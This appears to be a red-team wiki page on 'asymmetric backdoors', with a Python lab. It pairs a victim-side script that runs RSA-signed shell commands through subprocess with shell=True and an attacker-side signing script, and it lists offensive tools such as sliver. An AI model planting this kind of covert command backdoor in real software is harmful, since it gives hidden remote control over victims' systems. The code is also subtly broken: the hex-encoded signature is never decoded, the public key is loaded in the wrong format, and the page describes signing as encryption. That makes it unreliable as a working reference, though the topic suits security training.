---
icon: keycdn
---

# Asymmetric Backdoor

## Introduction

An **asymmetric backdoor** is a type of backdoor that uses **asymmetric cryptography** (public-key cryptography) to allow unauthorized access while ensuring that only the attacker with the corresponding private key can exploit it. This approach enhances stealth and security for the attacker, making detection and removal more difficult.

## How It Works?

* **Public-Key Encryption:** The attacker embeds a public key in the backdoor.
* **Secure Command Execution:** When an attacker wants to trigger the backdoor, they send a specially crafted command encrypted with their private key.
* **Validation & Execution:** The backdoor decrypts the command using the embedded public key and executes it only if the signature is valid.
* **Stealthy Communication:** Since only the attacker has the private key, others cannot generate valid commands, reducing the chance of discovery.

## Why Asymmetric Key?

* **No Hardcoded Passwords** – Unlike traditional backdoors, which use fixed credentials, an asymmetric backdoor prevents unauthorized access by other attackers.
* **Hard to Detect** – Traffic looks like normal encrypted communication, making it difficult for security tools to flag.
* **No Key Exchange Needed** – The attacker doesn’t need to retrieve a symmetric key from the target, reducing the risk of interception.

## Lab Setup

**Asymmetric backdoor** lab setup using **Python** and **RSA encryption** to securely execute commands on a target system.

**This backdoor will:**

1. **Use RSA encryption** to authenticate the attacker.
2. **Embed a public key** in the backdoor.
3. **Execute only valid commands** signed by the attacker's private key.

{% hint style="success" %}
**You need two machines:**\
\- **Attacker Machine** (your system)\
\- **Victim Machine** (target system)
{% endhint %}

**Step 1: Generate RSA Key Pair**

```
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -in private.pem -pubout -out public.pem
```

{% hint style="success" %}
* `private.pem` → Used by the attacker to sign commands.
* `public.pem` → Placed in the backdoor on the victim machine.
{% endhint %}



**Step 2: Setup the Backdoor on the Victim Machine**

Create a backdoor script that only executes commands signed by the attacker's private key.

```python
import os
import subprocess
import rsa

# Load attacker's public key
with open("public.pem", "rb") as pub_file:
    public_key = rsa.PublicKey.load_pkcs1(pub_file.read())

def verify_and_execute(signed_command, command):
    try:
        # Verify the command with the public key
        rsa.verify(command.encode(), signed_command, public_key)
        print(f"[+] Executing: {command}")
        output = subprocess.check_output(command, shell=True, text=True)
        return output
    except rsa.VerificationError:
        return "[-] Signature verification failed!"

# Start listening for commands
while True:
    signed_command = input("[+] Enter the signed command: ").encode()
    command = input("[+] Enter the original command: ")
    
    result = verify_and_execute(signed_command, command)
    print(result)

```

* This script **loads the attacker's public key**.
* It **verifies signed commands** before executing them.
* If the signature doesn’t match, the command is rejected.



#### **Step 3: Sign Commands on the Attacker Machine**

On the **attacker's machine**, sign the command using the **private key**.

```python
import rsa

# Load attacker's private key
with open("private.pem", "rb") as priv_file:
    private_key = rsa.PrivateKey.load_pkcs1(priv_file.read())

def sign_command(command):
    signed_command = rsa.sign(command.encode(), private_key, "SHA-256")
    return signed_command

command = input("Enter command to sign: ")
signed = sign_command(command)

print("[+] Signed Command:")
print(signed.hex())  # Send this to the victim machine

```

* This script **signs a command** with the attacker's private key.
* The signed command is **sent to the victim for execution**.



**Step 4: Running the Attack**

* **Attacker Signs a Command**
  * Run `sign_command.py` on your **attacker machine**.
  * Enter a command (e.g., `whoami`).
  * Copy the **signed command output**.
* **Victim Executes the Signed Command**
  * Run `backdoor.py` on the **victim machine**.
  * Paste the **signed command** and the **original command**.
  * If the signature is valid, the command runs.



***

## Tools

* [https://github.com/infobyte/evilgrade](https://github.com/infobyte/evilgrade)
* [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
* [https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)



